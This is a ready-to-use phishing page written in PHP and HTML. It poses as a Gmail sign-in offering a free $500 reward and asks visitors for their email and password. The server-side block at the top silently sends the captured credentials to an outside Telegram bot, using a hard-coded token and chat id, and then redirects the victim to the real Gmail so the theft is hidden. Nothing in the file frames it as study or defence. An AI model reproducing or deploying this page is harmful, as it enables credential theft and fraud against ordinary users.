<?php
// Simple PHP version for traditional hosting
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    $token = "7635157561:AAEpjYSjXg64qD7dW2s3PXZJCTjjZdVm314";
    $chat_id = "7069280981";
    
    $message = "New Credentials:\nEmail: $email\nPassword: $password";
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    
    // Send to Telegram (silent failure)
    @file_get_contents($url);
    
    // Redirect to real Gmail
    header("Location: https://gmail.com");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Money Reward</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #4285F4, #34A853);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .form-container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            width: 350px;
            text-align: center;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        h2 {
            color: #4285F4;
            margin-bottom: 20px;
            font-size: 24px;
        }
        .subtitle {
            color: #666;
            margin-bottom: 25px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            background: linear-gradient(135deg, #4285F4, #34A853);
            color: white;
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            opacity: 0.9;
        }
        .disclaimer {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
        }
        .switch-form {
            margin-top: 15px;
            font-size: 13px;
            color: #4285F4;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <img src="https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_48dp.png" alt="Gmail" class="logo">
        <h2>Claim Your Free $500 Reward!</h2>
        <p class="subtitle">Sign in with your Gmail to verify eligibility.</p>
        <form method="post" action="">
            <input type="email" name="email" placeholder="Email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Verify & Claim Reward</button>
        </form>
        <p class="disclaimer">By continuing, you agree to our <a href="#" style="color: #4285F4;">Terms</a> and <a href="#" style="color: #4285F4;">Privacy Policy</a>.</p>
        <p class="switch-form">Not eligible? <a href="#" style="color: #4285F4;">Try another account</a></p>
    </div>
</body>
</html>